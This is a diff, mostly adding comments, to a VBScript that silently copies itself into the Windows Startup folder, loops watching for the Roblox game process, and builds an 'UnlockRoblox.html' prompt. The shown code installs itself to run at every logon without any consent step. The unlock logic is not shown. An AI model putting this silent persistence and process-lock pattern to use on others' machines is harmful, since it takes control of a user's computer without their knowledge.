@@ -1,15 +1,22 @@
+
+' Create a FileSystemObject
+Set fso = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("WScript.Shell")
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-Set fso = CreateObject("Scripting.FileSystemObject")
 
+' Get current script path
 currentScriptPath = WScript.ScriptFullName
+
+' Define the Startup folder path
 startupFolder = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
 startupScriptPath = fso.BuildPath(startupFolder, fso.GetFileName(currentScriptPath))
 
+' Copy the script to the Startup folder if it doesn't exist
 If Not fso.FileExists(startupScriptPath) Then
     fso.CopyFile currentScriptPath, startupScriptPath
 End If
 
+' Infinite loop to check for the process
 Do
     Set colProcesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='RobloxPlayerBeta.exe'")
     
@@ -25,10 +32,12 @@ Do
     WScript.Sleep 5000
 Loop
 
+' Subroutine to show an HTML prompt
 Sub ShowUnlockPrompt()
     Dim htmlFile, htmlContent
     htmlFile = fso.GetSpecialFolder(2) & "\UnlockRoblox.html"
 
+    ' Create HTML content
     htmlContent = "<!DOCTYPE html>" & _
                   "<html lang='en'>" & _
                   "<head>" & _
@@ -113,6 +122,7 @@ Sub ShowUnlockPrompt()
                   "}" & _
                   "</script></body></html>"
 
+    ' Create or overwrite the HTML file
     Dim ts
     Set ts = fso.CreateTextFile(htmlFile, True)
     ts.Write htmlContent
